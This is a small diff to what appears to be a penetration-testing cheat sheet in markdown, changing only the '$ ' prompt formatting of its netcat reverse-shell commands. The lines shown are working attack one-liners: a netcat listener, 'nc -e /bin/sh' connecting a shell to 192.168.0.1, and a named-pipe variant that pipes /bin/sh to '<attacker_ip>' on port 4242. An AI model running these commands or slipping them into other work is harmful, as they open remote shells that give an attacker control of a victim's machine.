@@ -61,13 +61,13 @@ $ nc -nvlp 4242
 
 + <b>Netcat - Connecting to Listener</b>
 ```console
-nc -e /bin/sh 192.168.0.1 4242
+$ nc -e /bin/sh 192.168.0.1 4242
 ```
 
 + <b>Netcat - Connecting to Listener without `-e`</b>
 ```console
-$mknod /tmp/backpipe p
-$/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
+$ mknod /tmp/backpipe p
+$ /bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 ```
 + <b>Metasploit - Listener</b>
 ```bash
